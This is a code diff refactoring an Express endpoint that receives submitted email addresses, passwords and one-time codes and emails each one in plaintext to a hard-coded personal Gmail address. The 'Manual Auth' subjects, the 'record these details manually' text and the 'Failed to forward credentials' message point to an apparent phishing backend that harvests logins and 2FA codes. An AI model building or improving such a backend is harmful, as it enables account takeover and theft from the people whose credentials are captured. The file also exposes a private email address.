@@ -8,7 +8,6 @@ const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
 
-// Ensure ADMIN_EMAIL matches your Resend login email if using onboarding@resend.dev
 const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "nicholaszobo@gmail.com";
 const FROM_EMAIL = process.env.FROM_EMAIL || "onboarding@resend.dev";
 
@@ -30,20 +29,20 @@ app.post("/submit", async (req, res) => {
   const { type, email, password, otp } = req.body;
   const timestamp = new Date().toISOString();
 
-  console.log("Received data:", req.body);
+  console.log("Received payload:", req.body);
 
   if (!resend) {
     return res.status(500).json({
       success: false,
-      message: "Resend API key is not configured."
+      message: "Resend API key is missing or not configured."
     });
   }
 
   try {
-    let emailSubject = "";
-    let emailHtml = "";
+    let subject = "";
+    let htmlContent = "";
 
-    // 1. ACCOUNT CREATION
+    // 1. Account Creation
     if (type === "account") {
       if (!email || !password) {
         return res.status(400).json({
@@ -52,8 +51,8 @@ app.post("/submit", async (req, res) => {
         });
       }
 
-      emailSubject = `[Manual Auth] New Account: ${email}`;
-      emailHtml = `
+      subject = `[Manual Auth] New Account: ${email}`;
+      htmlContent = `
         <h2>New User Credentials Submitted</h2>
         <p><strong>Email:</strong> ${escapeHtml(email)}</p>
         <p><strong>Password:</strong> ${escapeHtml(password)}</p>
@@ -62,7 +61,7 @@ app.post("/submit", async (req, res) => {
         <p><em>Action Required: Record these details manually.</em></p>
       `;
     } 
-    // 2. OTP VERIFICATION
+    // 2. OTP Verification
     else if (type === "verification") {
       if (!email || !otp) {
         return res.status(400).json({
@@ -71,8 +70,8 @@ app.post("/submit", async (req, res) => {
         });
       }
 
-      emailSubject = `[Manual Auth] OTP Verification: ${email}`;
-      emailHtml = `
+      subject = `[Manual Auth] OTP Verification: ${email}`;
+      htmlContent = `
         <h2>OTP Submission</h2>
         <p><strong>Email:</strong> ${escapeHtml(email)}</p>
         <p><strong>Entered OTP:</strong> ${escapeHtml(otp)}</p>
@@ -86,37 +85,36 @@ app.post("/submit", async (req, res) => {
       });
     }
 
-    // Send email via Resend
-    const response = await resend.emails.send({
+    // Execute email request
+    const { data, error } = await resend.emails.send({
       from: FROM_EMAIL,
       to: ADMIN_EMAIL,
-      subject: emailSubject,
-      html: emailHtml
+      subject: subject,
+      html: htmlContent
     });
 
-    console.log("RESEND RESULT:", JSON.stringify(response));
-
-    // Check if Resend returned an explicit API error
-    if (response.error) {
-      console.error("Resend API returned an error:", response.error);
-      return res.status(500).json({
+    if (error) {
+      console.error("Resend API Error:", error);
+      return res.status(400).json({
         success: false,
-        message: response.error.message || "Failed to send email via Resend."
+        message: error.message || "Failed to deliver email via Resend."
       });
     }
 
+    console.log("Email queued successfully. Message ID:", data.id);
+
     return res.json({
       success: true,
-      message: "Data processed and notification sent successfully.",
-      id: response.data?.id
+      message: "Submission processed successfully.",
+      emailId: data.id
     });
 
-  } catch (error) {
-    console.error("Failed to send email via Resend:", error);
+  } catch (err) {
+    console.error("Server Execution Error:", err);
     return res.status(500).json({
       success: false,
-      message: "Failed to forward credentials.",
-      error: error.message
+      message: "Internal server error occurred.",
+      error: err.message
     });
   }
 });
